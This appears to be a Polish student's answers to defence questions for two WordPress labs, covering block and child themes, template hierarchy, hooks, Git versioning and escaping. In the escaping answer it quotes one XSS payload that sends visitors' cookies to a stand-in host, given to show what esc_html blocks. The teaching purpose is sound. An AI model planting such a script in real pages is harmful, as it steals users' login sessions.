# Pytania kontrolne (obrona) L4 i L5 — odpowiedzi · Auto Lśnienie (MP2)

Odpowiedzi odnoszą się do moich motywów: `wp-content/themes/auto-lsnienie-blok` (L4) i `wp-content/themes/al-child` (L5).

---

## L4 — Motyw blokowy

**1. Jakie pliki są niezbędne, aby WordPress rozpoznał motyw blokowy?**
Minimum to dwa pliki: `style.css` z nagłówkiem (`Theme Name:` itd.) i `templates/index.html`.
To `templates/index.html` mówi WordPressowi, że motyw jest blokowy. Do tego zwykle dochodzi `theme.json`
(ustawienia i style), `parts/` (nagłówek, stopka), `patterns/` i `styles/`. U mnie są wszystkie.

**2. Którego szablonu użyje WordPress dla strony „Kontakt”, jeśli istnieją `page.html` i `index.html`? A jeśli dodasz `page-kontakt.html`?**
Bez dodatkowego pliku użyje `page.html`, bo to najbardziej szczegółowy pasujący szablon
(`page-{slug}` → `page` → `singular` → `index`). Po dodaniu `page-kontakt.html` wybierze właśnie jego,
bo pasuje do slugu `kontakt` i jest bardziej szczegółowy niż `page.html`. U siebie sprawdziłem to na wszystkich
widokach, a tabela jest w README motywu.

**3. Gdzie zapisują się zmiany z edytora witryny przed i po użyciu „Zapisz zmiany w motywie”?**
Przed: w **bazie danych** jako wpisy typu `wp_template` / `wp_template_part` / `wp_global_styles`.
Pliki motywu się nie zmieniają, a takie zmiany przykrywają pliki. Po kliknięciu „Zapisz zmiany w motywie”
(Create Block Theme) zmiany trafiają do **plików motywu** (`templates/`, `parts/`, `theme.json`).
Wtedy widać je w `git diff` i można je zacommitować.

**4. Czym wariant stylu różni się od Dodatkowego CSS?**
Wariant stylu (`styles/ciemny.json`) to plik w formacie `theme.json`: podmienia **wartości presetów**
(kolory, fonty), więc zmieniają się wszystkie miejsca, które z nich korzystają, a użytkownik wybiera
wariant jednym kliknięciem w Stylach. Jest częścią motywu i jest w Gicie. Dodatkowy CSS to ręczne reguły CSS
zapisane w bazie. Nie są presetami, edytor ich nie „rozumie” i łatwo nimi rozjechać wygląd.

**5. Dlaczego motyw wersjonujesz w Git i jak oznaczasz kolejne wersje?**
Git daje historię zmian (kto, co, kiedy), możliwość cofnięcia błędu i pracę w zespole. Repo na GitHubie
jest też kopią zapasową i miejscem oddania pracy. Wersje oznaczam numerem `Version:` w `style.css`
i **tagiem** Git (`git tag -a v0.1.0 -m "…"`, potem `git push --tags`), według wersjonowania semantycznego:
poprawka 0.1.1, nowa funkcja 0.2.0.

---

## L5 — Motyw potomny i PHP

**1. Co musi zawierać nagłówek `style.css` motywu potomnego i co się stanie, gdy pole `Template:` będzie błędne?**
Musi mieć `Theme Name:` i **`Template:`**, czyli nazwę **katalogu** rodzica (u mnie `twentytwentyone`).
Pozostałe pola (Author, Version, Text Domain…) są zalecane. Gdy `Template:` jest błędne, WordPress nie znajdzie
rodzica: motyw na liście ma komunikat, że jest uszkodzony (brak motywu nadrzędnego), i nie da się go włączyć.

**2. Który plik wybierze WordPress dla strony o slugu „o-nas”, jeśli istnieją `page.php` w rodzicu i `page-o-nas.php` w potomku? Dlaczego?**
`page-o-nas.php` z potomka. Po pierwsze jest bardziej szczegółowy w hierarchii (`page-{slug}` jest przed `page`).
Po drugie WordPress szuka plików najpierw w motywie potomnym, potem w rodzicu. Pozostałe strony,
np. „Usługi”, dalej używają `page.php` rodzica (sprawdziłem: nie mają mojej klasy `al-o-nas`).

**3. Czym różni się `add_action` od `add_filter` i co się stanie, gdy funkcja filtra nie zwróci wartości?**
Akcja **wykonuje kod** w danym momencie i nic nie musi zwracać, np. `wp_enqueue_scripts` ładuje style.
Filtr **dostaje wartość, zmienia ją i musi ją zwrócić**, np. `the_content` dostaje treść wpisu, a ja dopisuję
notkę. Jeśli filtr nic nie zwróci, wynikiem będzie `null`, czyli w przypadku `the_content` treść wpisu
zniknie ze strony.

**4. Po co prefiksy funkcji (`al_`) i escaping (`esc_html`, `esc_url`)? Podaj przykład ataku, któremu zapobiega escaping.**
Prefiksy: w PHP dwie funkcje o tej samej nazwie dają błąd krytyczny (biała strona). Prefiks `al_` sprawia,
że moje funkcje nie zderzą się z funkcjami rodzica ani wtyczek.
Escaping chroni przed **XSS** (wstrzyknięciem skryptu). Przykład: ktoś z dostępem do Customizera wpisze w polu
telefonu `<script>document.location='http://zly.pl/?c='+document.cookie</script>`. Bez `esc_html()` każdy
odwiedzający stronę „O nas” wykonałby ten skrypt, a ciasteczka logowania wyciekłyby. Z `esc_html()` znaki
`<` i `>` zamieniają się na `&lt;` i `&gt;`, więc skrypt wyświetla się jako zwykły tekst. `esc_url()` dodatkowo
blokuje linki typu `javascript:`.

**5. Kiedy wybierzesz styl bloku, kiedy wzorzec (pattern), a kiedy blok dynamiczny z `render.php`?**
- **Styl bloku** (`register_block_style`): gdy chcę inny **wygląd** istniejącego bloku, np. przycisk
  „Z cieniem”, grupa „Karta”. Tylko CSS (klasa `is-style-…`), bez nowej funkcji.
- **Wzorzec**: gdy chcę gotowy **zestaw bloków** do wstawienia i dalszej edycji, np. hero z CTA albo
  sekcja usług. Po wstawieniu to zwykłe bloki, które redaktor zmienia na danej stronie.
- **Blok dynamiczny**: gdy treść ma się **liczyć na serwerze przy każdym wyświetleniu** i być wszędzie aktualna,
  np. dane firmy z ustawień. U mnie zmiana telefonu w Customizerze od razu zmienia blok na „O nas” i w stopce.
